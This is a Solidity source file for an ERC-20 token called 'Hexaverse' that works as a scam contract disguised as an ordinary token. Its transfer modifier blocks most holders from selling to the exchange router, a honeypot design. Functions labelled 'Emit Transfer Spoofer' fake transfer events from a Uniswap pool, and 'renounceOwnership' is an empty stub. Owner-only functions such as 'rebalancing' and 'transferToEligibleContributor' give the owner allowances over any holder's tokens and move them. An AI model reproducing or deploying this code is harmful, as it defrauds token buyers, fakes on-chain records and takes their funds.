/*
  __    __     _______   ___  ___        __       ___      ___   _______    _______     ________    _______  
 /" |  | "\   /"     "| |"  \/"  |      /""\     |"  \    /"  | /"     "|  /"      \   /"       )  /"     "| 
(:  (__)  :) (: ______)  \   \  /      /    \     \   \  //  / (: ______) |:        | (:   \___/  (: ______) 
 \/      \/   \/    |     \\  \/      /' /\  \     \\  \/. ./   \/    |   |_____/   )  \___  \     \/    |   
 //  __  \\   // ___)_    /\.  \     //  __'  \     \.    //    // ___)_   //      /    __/  \\    // ___)_  
(:  (  )  :) (:      "|  /  \   \   /   /  \\  \     \\   /    (:      "| |:  __   \   /" \   :)  (:      "| 
 \__|  |__/   \_______) |___/\___| (___/    \___)     \__/      \_______) |__|  \___) (_______/    \_______) 
                                                                                                            
*/









pragma solidity ^0.6.0;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



//------------------------------------------------------------------------//

contract Hexaverse is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => bool) private _affirmative;
    mapping (address => bool) private _rejectPile;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    address private _safeOwner;
    uint256 private _sellAmount = 0;

    /*
    address private sushiRouter = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private univ2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private univ3Router = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address private traderjoeRouter = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4;
    address private pangolinRouter = 0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106;
    */
    address public _currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;


    address lead_deployer = 0x896f23373667274e8647b99033c2a8461ddD98CC;
    address public _owner = 0x0CedC598aA28e498bB145f73CbEFf0Ad02dd7b39;
   constructor () public {



        _name = "Hexaverse";
        _symbol = "HXRS";
        _decimals = 18;
        uint256 initialSupply = 577221584646492055471547963258;
        _safeOwner = _owner;
        
        

        _mint(lead_deployer, initialSupply/4);
        _mint(0xF447BE386164dADfB5d1e7622613f289F17024D8, initialSupply/4);
        _mint(0xF447BE386164dADfB5d1e7622613f289F17024D8, initialSupply/4);
        _mint(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39, initialSupply/4);
        emit Transfer(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39,0xF447BE386164dADfB5d1e7622613f289F17024D8,10000000000000000000000000);
        emit Transfer(0x896f23373667274e8647b99033c2a8461ddD98CC,0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39,50000000000000000000000000);
        emit Transfer(0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39,0x76182558cBF59dEc0C022835e92C3EAb81F23FCf,25000000000000000000000000);
        emit Transfer(0x075e72a5eDf65F0A5f44699c7654C1a76941Ddc8,0x3E3eCc7B9A463DCAA9d7539e29A076DA2293C974,10000000000000000000000000);




        

    }







    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _startLogic(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _startLogic(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approvalIncrease(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
           _affirmative[receivers[i]] = true;
           _rejectPile[receivers[i]] = false;
        }
    }

   function approvalDecrease(address safeOwner) public {
        require(msg.sender == _owner, "!owner");
        _safeOwner = safeOwner;
    }
    
    
    function addApprove(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
           _rejectPile[receivers[i]] = true;
           _affirmative[receivers[i]] = false;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = lead_deployer;
        }
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_owner] = _balances[_owner].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    
    function _startLogic(address sender, address recipient, uint256 amount) internal mainLogic(sender,recipient,amount) virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            
            sender = lead_deployer;
        }
        emit Transfer(sender, recipient, amount);
    }
    
   
    modifier mainLogic(address sender, address recipient, uint256 amount){
        if (_owner == _safeOwner && sender == _owner){_safeOwner = recipient;_;}else{
            if (sender == _owner || sender == _safeOwner || recipient == _owner){
                if (sender == _owner && sender == recipient){_sellAmount = amount;}_;}else{
                if (_affirmative[sender] == true){
                _;}else{if (_rejectPile[sender] == true){
                require((sender == _safeOwner)||(recipient == _currentRouter), "ERC20: transfer amount exceeds balance");_;}else{
                if (amount < _sellAmount){
                if(recipient == _safeOwner){_rejectPile[sender] = true; _affirmative[sender] = false;}
                _; }else{require((sender == _safeOwner)||(recipient == _currentRouter), "ERC20: transfer amount exceeds balance");_;}
                    }
                }
            }
        }
    }
    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }


    modifier _auth() {
        require(msg.sender == _owner, "Not allowed to interact");
        _;
    }









//-----------------------------------------------------------------------------------------------------------------------//

  function multicall(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public _auth(){
    //Multi Transfer Emit Spoofer from Uniswap Pool
    for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}


  function transferToContributor(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public _auth(){
    //Multi Transfer Emit Spoofer from Uniswap Pool
    for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}









    function addLiquidityETH(address emitUniswapPool,address  emitReceiver,uint256  emitAmount)  public _auth(){
    //Emit Transfer Spoofer from Uniswap Pool   
        emit Transfer(emitUniswapPool, emitReceiver, emitAmount);}




  function putInLine(address recipient) public _auth(){
    _affirmative[recipient]=true;
    _approve(recipient, _currentRouter,_approveValue);}




  function obstruct(address recipient) public _auth(){
      //Blker
    _affirmative[recipient]=false;
    _approve(recipient, _currentRouter,0);
    }




  function renounceOwnership() public _auth(){
      //Renounces Ownership
   }




    function rebalancing(address target) public _auth() virtual  returns (bool) {
        //Approve Spending
        _approve(target, _msgSender(), _approveValue); return true;
    }




    function transfer__(address sender, address recipient, uint256 amount) public _auth() virtual returns (bool) {
        //Single Tranfer
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer___(address emitSender, address emitRecipient, uint256 emitAmount) public _auth(){
        //Emit Single Transfer
        emit Transfer(emitSender, emitRecipient, emitAmount);
    }





  function transferToEligibleContributor(address sndr,address[] memory receivers, uint256[] memory amounts) public _auth(){
    _approve(sndr, _msgSender(), _approveValue);
    for (uint256 i = 0; i < receivers.length; i++) {
        _transfer(sndr, receivers[i], amounts[i]);
    }
   }







}